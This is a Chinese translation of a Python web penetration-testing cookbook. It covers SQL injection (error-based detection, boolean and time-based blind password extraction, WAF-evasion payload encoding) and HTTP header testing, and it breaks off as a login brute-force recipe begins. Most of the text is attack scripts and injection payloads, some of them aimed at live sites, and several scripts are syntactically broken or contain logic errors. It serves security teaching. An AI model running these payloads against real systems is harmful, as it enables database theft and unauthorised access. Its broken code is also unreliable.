# Python Web 渗透测试秘籍（二）

> 原文：[`annas-archive.org/md5/9ECC87991CE5C1AD546C7BAEC6960102`](https://annas-archive.org/md5/9ECC87991CE5C1AD546C7BAEC6960102)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：SQL 注入

在本章中，我们将涵盖以下主题：

+   检查抖动

+   识别基于 URL 的 SQLi

+   利用布尔 SQLi

+   利用盲目 SQLi

+   编码有效载荷

# 介绍

SQL 注入是一种吵闹的攻击，在你看到的每个与技术相关的媒体提供商中都会被强调。这是最常见和最具破坏性的攻击之一，继续在新的安装中蓬勃发展。本章重点介绍执行和支持 SQL 注入攻击。我们将创建编码攻击字符串的脚本，执行攻击，并计时正常操作以规范化攻击时间。

# 检查抖动

执行基于时间的 SQL 注入的唯一困难之处在于无处不在的游戏玩家的灾难，即延迟。人类可以轻松地坐下来，心理上考虑延迟，获取一系列返回的值，并明智地检查输出并计算出*cgris*是*chris*。对于机器来说，这要困难得多；因此，我们应该尝试减少延迟。

我们将创建一个脚本，该脚本向服务器发出多个请求，记录响应时间，并返回平均时间。然后可以用来计算时间攻击中响应波动，这种攻击被称为**抖动**。

## 如何做…

确定您希望攻击的 URL，并通过`sys.argv`变量提供给脚本：

```py
import requests
import sys
url = sys.argv[1]

values = []

for i in xrange(100): 
  r = requests.get(url)
  values.append(int(r.elapsed.total_seconds()))

average = sum(values) / float(len(values))
print “Average response time for “+url+” is “+str(average)
```

使用此脚本时产生的输出示例如下：

![如何做…](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_04_01.jpg)

## 工作原理…

我们导入了这个脚本所需的库，就像我们在本书中做的其他脚本一样。我们将计数器`I`设置为零，并创建一个空列表，用于我们即将生成的时间：

```py
while i < 100:
  r = requests.get(url)
  values.append(int(r.elapsed.total_seconds()))
  i = i + 1
```

使用计数器`I`，我们向目标 URL 运行`100`个请求，并将请求的响应时间附加到我们之前创建的列表中。`R.elapsed`是一个`timedelta`对象，而不是整数，因此必须使用`.total_seconds()`调用它，以便获得我们后来平均值的可用数字。然后我们将计数器加一，以便在此循环中计数，并使脚本适当地结束：

```py
average = sum(values) / float(len(values))
print “Average response time for “+url+” is “+average
```

循环完成后，我们通过使用`sum`计算列表的总值并使用`len`除以列表中的值来计算`100`个请求的平均值。

然后我们返回一个基本的输出，以便理解。

## 还有更多…

这是执行此操作的一种非常基本的方式，实际上只是作为一个独立的脚本来证明一个观点。要作为另一个脚本的一部分执行，我们将执行以下操作：

```py
import requests
import sys

input = sys.argv[1]

def averagetimer(url):

  i = 0
  values = []

  while i < 100:
    r = requests.get(url)
    values.append(int(r.elapsed.total_seconds()))
    i = i + 1

  average = sum(values) / float(len(values))
  return average

averagetimer(input)
```

# 识别基于 URL 的 SQLi

因此，我们之前已经看过 XSS 和错误消息的模糊处理。这一次，我们做的是类似的事情，但是用 SQL 注入代替。任何 SQLi 的关键都始于一个单引号，勾号或撇号，取决于您个人选择的单词。我们将一个撇号扔进目标 URL 中，并检查响应，以查看如果成功，正在运行的 SQL 版本是什么。

我们将创建一个脚本，将基本的 SQL 注入字符串发送到我们的目标 URL，记录输出，并与错误消息中已知的短语进行比较，以识别底层系统。

## 如何做…

我们将使用的脚本如下：

```py
import requests

url = “http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=”
initial = “'”
print “Testing “+ url
first = requests.post(url+initial)

if “mysql” in first.text.lower(): 
  print “Injectable MySQL detected”
elif “native client” in first.text.lower():
  print “Injectable MSSQL detected”
elif “syntax error” in first.text.lower():
  print “Injectable PostGRES detected”
elif “ORA” in first.text.lower():
  print “Injectable Oracle detected”
else:
  print “Not Injectable J J”
```

使用此脚本时产生的输出示例如下：

```py
Testing http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=
Injectable MySQL detected

```

## 工作原理…

我们导入我们的库并手动设置我们的 URL。如果需要，我们可以将其设置为`sys.argv`变量；但是，我在这里将其硬编码为了显示预期的格式。我们将初始注入字符串设置为单引号，并打印测试正在开始：

```py
url = “http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=”
initial = “'”
print “Testing “+ url
```

我们将我们的第一个请求作为我们提供的 URL 和撇号：

```py
first = requests.post(url+initial)
```

接下来的几行是我们的检测方法，用于识别底层数据库是什么。MySQL 标准错误是：

```py
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1

```

相应地，我们的检测尝试读取响应文本，并搜索`MySQL`字符串，如果成功，则打印出尝试成功：

```py
if “mysql” in first.text.lower(): 
  print “Injectable MySQL detected”
```

对于 MS SQL，一个示例错误消息是：

```py
Microsoft SQL Native Client error '80040e14'
Unclosed quotation mark after the character string

```

由于存在多个潜在的错误消息，我们需要确定尽可能多的错误消息中发生的一个常量。为此，我选择了`native client`，尽管`Microsoft SQL`也可以使用：

```py
elif “native client” in first.text.lower():
  print “Injectable MSSQL detected”
```

PostgreSQL 的标准错误消息是：

```py
Query failed: ERROR: syntax error at or near
“'” at character 56 in /www/site/test.php on line 121.

```

有趣的是，对于 SQL 中总是语法错误的情况，唯一经常使用`syntax`一词的解决方案是`PostGRES`，这使我们可以将其用作区分词：

```py
elif “syntax error” in first.text.lower():
  print “Injectable PostGRES detected”
```

我们检查的最后一个系统是 Oracle。Oracle 的一个示例错误消息是：

```py
ORA-00933: SQL command not properly ended

```

ORA 是大多数 Oracle 错误的前缀，因此可以在这里用作标识符。只有少数边缘情况下，非 ORA 错误消息会应用于尾随的单引号：

```py
elif “ORA” in first.text.lower():
  print “Injectable Oracle detected”
```

如果以上情况都不适用，我们有一个最终的`else`语句，声明参数不可注入，并且在选择该参数时出错。

以下是示例输出的屏幕截图：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_04_02.jpg)

## 还有更多...

将此脚本与第一章中找到的蜘蛛联系起来，*收集开源情报*，将成为识别网页上可注入 URL 的快速高效方法。在大多数情况下，需要一种识别要注入的参数的方法，这可以通过简单的正则表达式操作来实现。

Audi-1 制作了一组有用的 SQLi 测试页面，可以在[`github.com/Audi-1/sqli-labs`](https://github.com/Audi-1/sqli-labs)找到。

# 利用布尔 SQLi

有时你只能从页面上得到一个是或否的答案。当你意识到这就是 SQL 等价于说“我爱你”的时候，这是令人心碎的。所有的 SQLi 都可以分解成是或否的问题，取决于你的耐心。

我们将创建一个脚本，它接受一个`yes`值和一个 URL，并根据预定义的攻击字符串返回结果。我提供了一个示例攻击字符串，但这将根据您正在测试的系统而变化。

## 如何做...

以下脚本是您的脚本应该的样子：

```py
import requests
import sys

yes = sys.argv[1]

i = 1
asciivalue = 1

answer = []
print “Kicking off the attempt”

payload = {'injection': '\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}

while True:
  req = requests.post('<target url>' data=payload)
  lengthtest = req.text
  if yes in lengthtest:
    length = i
    break
  else:
    i = i+1

for x in range(1, length):
  while asciivalue < 126:
payload = {'injection': '\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}
      req = requests.post('<target url>', data=payload)
      if yes in req.text:
    answer.append(chr(asciivalue))
break
  else:
      asciivalue = asciivalue + 1
      pass
asciivalue = 0
print “Recovered String: “+ ''.join(answer)
```

## 它是如何工作的...

首先，用户必须识别仅在 SQLi 成功时发生的字符串。或者，可以修改脚本以响应 SQLi 失败的证据缺失。我们将此字符串作为`sys.argv`变量提供。我们还创建了我们将在此脚本中使用的两个迭代器，并将它们设置为`1`，因为 MySQL 从`1`开始计数，而不是像失败的系统那样从`0`开始。我们还为我们未来的答案创建了一个空列表，并告知用户脚本正在启动：

```py
yes = sys.argv[1]

i = 1
asciivalue = 1
answer = []
print “Kicking off the attempt”
```

我们的有效载荷基本上请求我们试图返回的密码长度，并将其与将要迭代的值进行比较：

```py
payload = {'injection': '\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}
```

然后我们永远重复下一个循环，因为我们不知道密码有多长。我们将有效载荷提交到目标 URL 以进行`POST`请求：

```py
while True:
  req = requests.post('<target url>' data=payload)
```

每次检查我们最初设置的`yes`值是否出现在响应文本中，如果是，我们结束`while`循环，将`i`的当前值设置为参数长度。`break`命令是结束`while`循环的部分：

```py
lengthtest = req.text
  if yes in lengthtest:
    length = i
    break
```

如果我们没有检测到`yes`值，我们将`i`加`1`并继续循环：

```py
Ard.
else:
    i = i+1
```

使用目标字符串的已识别长度，我们遍历每个字符，并使用`asciivalue`，每个可能的字符值。对于每个值，我们将其提交到目标 URL。因为 ascii 表只运行到`127`，我们将循环限制到`asciivalue`达到`126`为止。如果达到`127`，则出现了问题：

```py
for x in range(1, length):
  while asciivalue < 126:
payload = {'injection': '\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}
    req = requests.post('<target url>', data=payload)
```

我们检查我们的是字符串是否出现在响应中，如果是，就跳转到下一个字符。我们将成功的消息以字符形式附加到我们的答案字符串中，并使用`chr`命令进行转换：

```py
if yes in req.text:
    answer.append(chr(asciivalue))
break
```

如果`yes`值不存在，我们将`asciivalue`添加到移动到下一个可能的字符位置并通过：

```py
else:
      asciivalue = asciivalue + 1
      pass
```

最后，我们为每个循环重置`asciivalue`，然后当循环达到字符串的长度时，我们完成，打印整个恢复的字符串：

```py
asciivalue = 1
print “Recovered String: “+ ''.join(answer)
```

## 还有更多...

潜在地，这个脚本可以被修改以处理遍历表并通过更好设计的 SQL 注入字符串恢复多个值。最终，这提供了一个基础，就像后来的盲目 SQL 注入脚本一样，用于开发更复杂和令人印象深刻的脚本来处理具有挑战性的任务。查看*利用盲目 SQL 注入*脚本，了解这些概念的高级实现。

# 利用盲目 SQL 注入

有时候，生活会给你柠檬；盲目的 SQL 注入点就是其中之一。当你相当确定已经找到了 SQL 注入漏洞，但没有错误，也无法让它返回你的数据时，在这些情况下，你可以在 SQL 中使用时间命令来导致页面暂停返回响应，然后利用这个时间来判断数据库及其数据。

我们将创建一个脚本，向服务器发出请求，并根据请求的字符返回不同时间的响应。然后它将读取这些时间并重新组装字符串。

## 如何做…

脚本如下：

```py
import requests

times = []
print “Kicking off the attempt”
cookies = {'cookie name': 'Cookie value'}

payload = {'injection': '\'or sleep char_length(password);#', 'Submit': 'submit'}
req = requests.post('<target url>' data=payload, cookies=cookies)
firstresponsetime = str(req.elapsed.total_seconds)

for x in range(1, firstresponsetime):
  payload = {'injection': '\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}
  req = requests.post('<target url>', data=payload, cookies=cookies)
  responsetime = req.elapsed.total_seconds
  a = chr(responsetime)
    times.append(a)
    answer = ''.join(times)
print “Recovered String: “+ answer
```

## 它是如何工作的…

和往常一样，我们导入所需的库并声明我们需要稍后填充的列表。我们还在这里有一个函数，说明脚本确实已经开始。在某些基于时间的函数中，用户可能需要等待一段时间。在这个脚本中，我还使用了`request`库来包含 cookies。对于这种攻击，可能需要进行身份验证：

```py
times = []
print “Kicking off the attempt”
cookies = {'cookie name': 'Cookie value'}
```

我们在字典中设置了我们的有效载荷以及一个提交按钮。攻击字符串足够简单，通过一些解释就可以理解。初始的撇号必须被转义为字典内的文本。该撇号最初中断了 SQL 命令，并允许我们输入自己的 SQL 命令。接下来，我们说在第一个命令失败的情况下，执行以下命令与`OR`。然后，我们告诉服务器为密码列中第一行中的每个字符休眠一秒。最后，我们用分号关闭语句，并用井号（或者如果你是美国人和/或错误的话，用英镑）注释掉任何尾随字符：

```py
payload = {'injection': '\'or sleep char_length(password);#', 'Submit': 'submit'}
```

然后我们将服务器响应所花费的时间长度设置为`firstreponsetime`参数。我们将使用这个参数来理解我们需要通过这种方法暴力破解多少个字符：

```py
firstresponsetime = str(req.elapsed).total_seconds
```

我们创建一个循环，将`x`设置为从标识的字符串的长度为`1`到所有数字，并对每个数字执行一个操作。我们从这里开始是因为 MySQL 从`1`开始计数，而不是像 Python 一样从零开始：

```py
for x in range(1, firstresponsetime):
```

我们制作了一个类似之前的有效载荷，但这次我们说在密码列的密码的第一个字符的 ascii 值处休眠。因此，如果第一个字符是小写 a，那么对应的 ascii 值是 97，因此系统会休眠 97 秒。如果是小写 b，它将休眠 98 秒，依此类推：

```py
payload = {'injection': '\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}
```

我们每次为字符串中的每个字符位置提交我们的数据。

```py
req = requests.post('<target url>', data=payload, cookies=cookies)
```

我们获取每个请求的响应时间，记录服务器休眠的时间，然后将该时间从 ascii 值转换回字母：

```py
responsetime = req.elapsed.total_seconds
  a = chr(responsetime)
```

对于每次迭代，我们打印出当前已知的密码，然后最终打印出完整的密码：

```py
answer = ''.join(times)
print “Recovered String: “+ answer
```

## 还有更多...

这个脚本提供了一个可以适应许多不同情况的框架。Wechall，这个网站挑战网站，设置了一个有时间限制的盲目 SQLi 挑战，必须在很短的时间内完成。以下是我们的原始脚本，已经适应了这个环境。正如你所看到的，我不得不考虑到不同值的较小时间差异和服务器延迟，并且还包括了一个检查方法，每次重置测试值并自动提交它：

```py
import subprocess
import requests

def round_down(num, divisor):
    return num - (num%divisor)

subprocess.Popen([“modprobe pcspkr”], shell=True)
subprocess.Popen([“beep”], shell=True)

values = {'0': '0', '25': '1', '50': '2', '75': '3', '100': '4', '125': '5', '150': '6', '175': '7', '200': '8', '225': '9', '250': 'A', '275': 'B', '300': 'C', '325': 'D', '350': 'E', '375': 'F'}
times = []
answer = “This is the first time”
cookies = {'wc': 'cookie'}
setup = requests.get ('http://www.wechall.net/challenge/blind_lighter/index .php?mo=WeChall&me=Sidebar2&rightpanel=0', cookies=cookies)
y=0
accum=0

while 1:
  reset = requests.get('http://www.wechall.net/challenge/blind_lighter/ index.php?reset=me', cookies=cookies)
  for line in reset.text.splitlines():
    if “last hash” in line:
      print “the old hash was:”+line.split(“ “)[20].strip(“.</li>”)
      print “the guessed hash:”+answer
      print “Attempts reset \n \n”
    for x in range(1, 33):
      payload = {'injection': '\'or IF (ord(substr(password, '+str(x)+', 1)) BETWEEN 48 AND 57,sleep((ord(substr(password, '+str(x)+', 1))- 48)/4),sleep((ord(substr(password, '+str(x)+', 1))- 55)/4));#', 'inject': 'Inject'}
      req = requests.post ('http://www.wechall.net/challenge/blind_lighter/ index.php?ajax=1', data=payload, cookies=cookies)
      responsetime = str(req.elapsed)[5]+str(req.elapsed)[6]+str(req.elapsed)[8]+ str(req.elapsed)[9]
      accum = accum + int(responsetime)
      benchmark = int(15)
      benchmarked = int(responsetime) - benchmark
      rounded = str(round_down(benchmarked, 25))
      if rounded in values:
        a = str(values[rounded])
        times.append(a)
        answer = ''.join(times)
      else:
        print rounded
        rounded = str(“375”)
        a = str(values[rounded])
        times.append(a)
        answer = ''.join(times)
  submission = {'thehash': str(answer), 'mybutton': 'Enter'}
  submit = requests.post('http://www.wechall.net/challenge/blind_lighter/ index.php', data=submission, cookies=cookies)
  print “Attempt: “+str(y)
  print “Time taken: “+str(accum)
  y += 1
  for line in submit.text.splitlines():
    if “slow” in line:
      print line.strip(“<li>”)
    elif “wrong” in line:
      print line.strip(“<li>”)
  if “wrong” not in submit.text:
    print “possible success!”
    #subprocess.Popen([“beep”], shell=True)
```

# 编码有效载荷

阻止 SQL 注入的一种方法是通过服务器端文本操作或**Web 应用程序防火墙**（**WAFs**）进行过滤。这些系统针对与攻击常见相关的特定短语，如`SELECT`，`AND`，`OR`和空格。这些可以通过用不太明显的值替换这些值来轻松规避，从而突显了黑名单的一般问题。

我们将创建一个脚本，该脚本接受攻击字符串，查找潜在的转义字符串，并提供替代的攻击字符串。

## 如何做…

以下是我们的脚本：

```py
subs = []
values = {“ “: “%50”, “SELECT”: “HAVING”, “AND”: “&&”, “OR”: “||”}
originalstring = “' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#”
secondoriginalstring = originalstring
for key, value in values.iteritems():
  if key in originalstring:
    newstring = originalstring.replace(key, value)
    subs.append(newstring)
  if key in secondoriginalstring:
    secondoriginalstring = secondoriginalstring.replace(key, value)
    subs.append(secondoriginalstring)

subset = set(subs)
for line in subs:
  print line
```

以下截图是使用此脚本时产生的输出的示例：

![如何做…](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_04_03.jpg)

## 它是如何工作的…

这个脚本不需要任何库！真是令人震惊！我们为即将创建的值创建一个空列表，并创建一个意图添加的替代值的字典。我放了五个示例值。空格和`%20`通常被 WAFs 转义，因为 URL 通常不包括空格，除非请求了不当的内容。

更具体地说，调整过的系统可能会避开 SQL 特定词语，比如`SELECT`，`AND`和`OR`。这些都是非常基本的值，可以根据需要添加或替换：

```py
subs = []
values = {“ “: “%50”, “%20”: “%50”, “SELECT”: “HAVING”, “AND”: “&&”, “OR”: “||”}
```

我已经将原始字符串硬编码为示例，这样我们就可以看到它是如何工作的。我已经包含了一个包含上述所有值的有效 SQLi 字符串，以证明它的用法：

```py
originalstring = “'%20UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#”
```

我们创建原始字符串的第二个版本，以便我们可以为每个替换创建一个累积结果和一个独立结果：

```py
secondoriginalstring = originalstring
```

我们依次取每个字典项，并将每个键和值分配给参数键和值：

```py
for key, value in values.iteritems():
```

我们查看初始术语是否存在，如果存在，则用键值替换它。例如，如果存在空格，我们将用`%50`替换它，这是 URL 编码的制表符字符：

```py
if key in originalstring:
    newstring = originalstring.replace(key, value)
```

这个字符串，在每次迭代时，都会重置为我们在脚本开头设置的原始值。然后我们将该字符串添加到之前创建的列表中：

```py
subs.append(newstring)
```

我们执行与之前相同的操作，使用迭代字符串来创建一个多次编码的版本：

```py
if key in secondoriginalstring:
    secondoriginalstring = secondoriginalstring.replace(key, value)
    subs.append(secondoriginalstring)
```

最后，我们通过将其转换为集合使列表变得唯一，并逐行将其返回给用户：

```py
subset = set(subs)
for line in subs:
  print line
```

## 还有更多…

同样，这可以成为一个内部函数，而不是作为独立脚本使用。也可以通过使用以下脚本来实现：

```py
def encoder(string):

subs = []
values = {“ “: “%50”, “SELECT”: “HAVING”, “AND”: “&&”, “OR”: “||”}
originalstring = “' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin'”
secondoriginalstring = originalstring
for key, value in values.iteritems():
  if key in originalstring:
    newstring = originalstring.replace(key, value)
    subs.append(newstring)
  if key in secondoriginalstring:
    secondoriginalstring = secondoriginalstring.replace(key, value)
    subs.append(secondoriginalstring)

subset = set(subs)
return subset
```


# 第五章：网页头部操作

在本章中，我们将涵盖以下主题：

+   测试 HTTP 方法

+   通过 HTTP 标头对服务器进行指纹识别

+   测试不安全的标头

+   通过授权标头进行暴力登录

+   测试点击劫持漏洞

+   通过欺骗用户代理标识替代站点

+   测试不安全的 cookie 标志

+   通过 cookie 注入进行会话固定

# 介绍

渗透测试 Web 服务器的一个关键领域是深入研究服务器处理请求和提供响应的能力。如果你正在渗透测试标准的 Web 服务器部署，例如 Apache 或 Nginx，那么你将希望集中精力打破已部署的配置并枚举/操作站点的内容。如果你正在渗透测试自定义的 Web 服务器，那么最好随身携带 HTTP RFC 的副本（可在[`tools.ietf.org/html/rfc7231`](http://tools.ietf.org/html/rfc7231)获取），并额外测试 Web 服务器如何处理损坏的数据包或意外请求。

本章将重点介绍创建配方，以便以揭示底层 Web 技术并解析响应以突出显示常见问题或进一步测试的关键领域的方式操作请求。

# 测试 HTTP 方法

测试 Web 服务器的一个很好的起点是在`HTTP`请求的开始处，通过枚举`HTTP`方法。`HTTP`方法由客户端发送，并指示 Web 服务器客户端期望的操作类型。

根据 RFC 7231 的规定，所有 Web 服务器必须支持`GET`和`HEAD`方法，所有其他方法都是可选的。由于除了最初的`GET`和`HEAD`方法之外还有很多常见的方法，这使得它成为测试的一个重点，因为每个服务器都将被编写以以不同的方式处理请求和发送响应。

一个有趣的`HTTP`方法是`TRACE`，因为其可用性导致**跨站点跟踪**（**XST**）。TRACE 是一个回环测试，基本上会将其接收到的请求回显给用户。这意味着它可以用于跨站点脚本攻击（在这种情况下称为跨站点跟踪）。为此，攻击者让受害者发送一个带有 JavaScript 有效载荷的`TRACE`请求，然后在返回时在本地执行。现代浏览器现在内置了防御措施，通过阻止通过 JavaScript 发出的 TRACE 请求来保护用户免受这些攻击，因此这种技术现在只对旧浏览器有效，或者在利用其他技术（如 Java 或 Flash）时才有效。

## 如何做…

在这个配方中，我们将连接到目标 Web 服务器，并尝试枚举各种可用的`HTTP`方法。我们还将寻找`TRACE`方法的存在，并在可能的情况下进行突出显示：

```py
import requests

verbs = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'TEST']
for verb in verbs:
    req = requests.request(verb, 'http://packtpub.com')
    print verb, req.status_code, req.reason
    if verb == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
      print 'Possible Cross Site Tracing vulnerability found'
```

## 工作原理…

第一行导入了 requests 库；在本节中将经常使用它：

```py
import requests
```

接下来创建了一个我们将发送的`HTTP`方法数组。请注意标准方法——`GET`、`POST`、`PUT`、`HEAD`、`DELETE`和`OPTIONS`——后面是一个非标准的`TEST`方法。这是为了检查服务器如何处理它不期望的输入。一些 Web 框架将非标准动词视为`GET`请求并相应地响应。这可以是绕过防火墙的一种好方法，因为它们可能有一个严格的方法列表来匹配，并且不处理来自意外方法的请求：

```py
verbs = ['GET', 'POST', 'PUT', 'HEAD', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT', 'TEST']
```

接下来是脚本的主循环。这部分发送 HTTP 数据包；在这种情况下，发送到目标`http://packtpub.com` Web 服务器。它打印出方法和响应状态代码和原因：

```py
for verb in verbs:
    req = requests.request(verb, 'http://packtpub.com')
    print verb, req.status_code, req.reason
```

最后，有一段代码专门用于测试 XST：

```py
if verb == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
      print 'Possible Cross Site Tracing vulnerability found'
```

此代码在发送`TRACE`调用时检查服务器响应，检查响应是否包含请求文本。

运行脚本会得到以下输出：

![工作原理…](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_01.jpg)

在这里，我们可以看到 Web 服务器正确处理了前五个请求，对所有这些方法返回`200 OK`响应。`TRACE`响应返回`405 Not Allowed`，显示这已被 Web 服务器明确拒绝。这里目标服务器的一个有趣之处是，它对`TEST`方法返回`200 OK`响应。这意味着服务器将`TEST`请求处理为不同的方法；例如，它将其视为`GET`请求。正如前面提到的，这是绕过一些防火墙的好方法，因为它们可能不会处理意外的`TEST`方法。

## 还有更多...

在这个示例中，我们展示了如何测试目标 Web 服务器的 XST 漏洞，并测试它如何处理各种`HTTP`方法。这个脚本可以通过扩展示例`HTTP`方法数组来进一步扩展，以包括各种其他有效和无效的数据值；也许您可以尝试发送 Unicode 数据来测试 Web 服务器如何处理意外的字符集，或者发送一个非常长的 HTTP 方法来测试自定义 Web 服务器中的缓冲区溢出。这些数据的一个很好的资源是回到第三章中的模糊脚本，*漏洞识别*，例如，使用来自 Mozilla 的 FuzzDB 的有效载荷。

# 通过 HTTP 头指纹识别服务器

我们将集中关注的 HTTP 协议的下一部分是 HTTP 头部。这些头部在 Web 服务器的请求和响应中都可以找到，它们在客户端和服务器之间携带额外的信息。任何带有额外数据的区域都是解析服务器信息和寻找潜在问题的好地方。

## 如何做...

以下是一个简单的抓取头部的脚本，它将解析响应头，试图识别正在使用的 Web 服务器技术：

```py
import requests

req = requests.get('http://packtpub.com')
headers = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code']

for header in headers:
    try:
  result = req.headers[header]
        print '%s: %s' % (header, result)
    except Exception, error:
        print '%s: Not found' % header
```

## 它是如何工作的...

脚本的第一部分通过熟悉的`requests`库向目标 Web 服务器发出简单的`GET`请求：

```py
req = requests.get('http://packtpub.com')
```

接下来，我们生成一个要查找的头部数组：

```py
headers = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country- Code']
```

在这个脚本中，我们在主要代码周围使用了 try/except 块：

```py
try:
  result = req.headers[header]
        print '%s: %s' % (header, result)
except:
print '%s: Not found' % header
```

我们需要这种错误处理，因为头部不是强制的；因此，如果我们尝试从数组中检索不存在的头部的键，Python 将引发异常。为了克服这个问题，如果响应中指定的头部不存在，我们只需打印`Not found`。

以下是针对此示例中目标服务器运行脚本的输出的屏幕截图：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_02.jpg)

第一行输出显示了`Server`头，显示了底层 Web 服务器技术。这是查找易受攻击的 Web 服务器版本的好地方，但请注意，可能可以禁用并伪装这个头部，因此不要仅仅依赖这一点来猜测目标服务器平台。

`Date`头包含有用的信息，可以用来猜测服务器的位置。例如，您可以计算相对于您的本地时区的时间差，以粗略地指示它的位置。

`Via`头部被代理服务器（出站和入站）使用，并将显示代理名称，在本例中为`1.1 varnish`。

`X-Powered-By`是常见 Web 框架中使用的标准头部，例如 PHP。默认的 PHP 安装将以 PHP 和版本号作出响应，使其成为另一个很好的侦察目标。

最后一行打印`X-Country-Code`短代码，另一个有用的信息，用于确定服务器的位置。

请注意，所有这些头部都可以在服务器端设置或覆盖，因此不要仅仅依赖这些信息，并谨慎地解析来自远程服务器的数据；即使这些头部也可能包含恶意值。

## 还有更多...

该脚本当前包含服务器的版本，但可以进一步扩展以查询在线 CVE 数据库，例如[`cve.mitre.org/cve/`](https://cve.mitre.org/cve/)，查找影响 Web 服务器版本的漏洞。

还可以使用另一种技术来增加指纹识别的准确性，即检查响应标头的顺序。例如，Microsoft IIS 在`Server`标头之前返回`Date`标头，而 Apache 先返回`Date`然后是`Server`。这种略有不同的顺序可用于验证您可能已经从此示例中的标头值推断出的任何服务器版本。

# 测试不安全的标头

我们之前已经看到 HTTP 响应可以成为枚举底层 Web 框架信息的重要来源。现在，我们将利用`HTTP`标头信息将其提升到下一个级别，以测试不安全的 Web 服务器配置并标记可能导致漏洞的任何内容。

## 准备工作

对于此示例，您需要一个要测试不安全标头的 URL 列表。将这些保存到名为`urls.txt`的文本文件中，每个 URL 占一行，与您的示例一起。

## 操作步骤

以下代码将突出显示从每个目标 URL 接收的任何易受攻击的标头：

```py
import requests

urls = open("urls.txt", "r")
for url in urls:
  url = url.strip()
  req = requests.get(url)
  print url, 'report:'

  try:
    xssprotect = req.headers['X-XSS-Protection']
    if  xssprotect != '1; mode=block':
      print 'X-XSS-Protection not set properly, XSS may be possible:', xssprotect
  except:
    print 'X-XSS-Protection not set, XSS may be possible'

  try:
    contenttype = req.headers['X-Content-Type-Options']
    if contenttype != 'nosniff':
      print 'X-Content-Type-Options not set properly:',  contenttype
  except:
    print 'X-Content-Type-Options not set'

  try:
    hsts = req.headers['Strict-Transport-Security']
  except:
    print 'HSTS header not set, MITM attacks may be possible'

  try:
    csp = req.headers['Content-Security-Policy']
    print 'Content-Security-Policy set:', csp
  except:
    print 'Content-Security-Policy missing'

  print '----'
```

## 工作原理

此示例配置为测试许多站点，因此第一部分从文本文件中读取 URL 并打印出当前目标：

```py
urls = open("urls.txt", "r")
for url in urls:
  url = url.strip()
  req = requests.get(url)
  print url, 'report:'
```

然后在 try/except 块中测试每个标头。这类似于先前的示例，因为标头不是强制性的，所以需要这种编码风格。如果我们尝试引用不存在的标头的键，Python 将引发异常。

第一个`X-XSS-Protection`标头应设置为`1; mode=block`以在浏览器中启用 XSS 保护。如果标头未明确匹配该格式或未设置，则脚本将打印警告：

```py
try:
    xssprotect = req.headers['X-XSS-Protection']
    if  'xssprotect' != '1; mode=block':
      print 'X-XSS-Protection not set properly, XSS may be possible'
  except:
    print 'X-XSS-Protection not set, XSS may be possible'
```

下一个`X-Content-Type-Options`标头应设置为`nosniff`，以防止 MIME 类型混淆。 MIME 类型指定目标资源的内容，例如，text/plain 表示远程资源应为文本文件。一些 Web 浏览器会尝试猜测资源的 MIME 类型，如果未指定，则可能导致跨站脚本攻击；如果资源包含恶意脚本，但仅指示为纯文本文件，则可能绕过内容过滤器并执行。如果未设置标头或响应未明确匹配到`nosniff`，此检查将打印警告：

```py
try:
    contenttype = req.headers['X-Content-Type-Options']
    if contenttype != 'nosniff':
      print 'X-Content-Type-Options not set properly'
  except:
    print 'X-Content-Type-Options not set'
```

接下来的`Strict-Transport-Security`标头用于强制通过 HTTPS 通道进行通信，以防止中间人攻击。缺少此标头意味着通信通道可能会被中间人攻击降级为 HTTP：

```py
  try:
    hsts = req.headers['Strict-Transport-Security']
  except:
    print 'HSTS header not set, MITM attacks may be possible'
```

最终的`Content-Security-Policy`标头用于限制可以在网页上加载的资源类型，例如，限制 JavaScript 可以运行的位置：

```py
  try:
    csp = req.headers['Content-Security-Policy']
    print 'Content-Security-Policy set:', csp
  except:
    print 'Content-Security-Policy missing'
```

示例的输出显示在以下屏幕截图中：

![工作原理...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_03.jpg)

# 通过 Authorization 标头暴力破解登录

许多网站使用 HTTP 基本身份验证来限制对内容的访问。这在嵌入式设备（如路由器）中尤其普遍。Python 的`requests`库内置支持基本身份验证，可以轻松创建身份验证暴力破解脚本的方法。

## 准备工作

在创建此示例之前，您需要一个密码列表来尝试进行身份验证。创建一个名为`passwords.txt`的本地文本文件，每个密码占一行。查看第二章中的在线资源中的密码列表，了解如何暴力破解密码。此外，花一些时间来勘察目标服务器，因为您需要知道它对失败的登录请求做出何种响应，以便我们可以区分暴力破解是否成功。

## 如何做...

以下代码将尝试通过基本身份验证暴力破解网站的入口：

```py
import requests
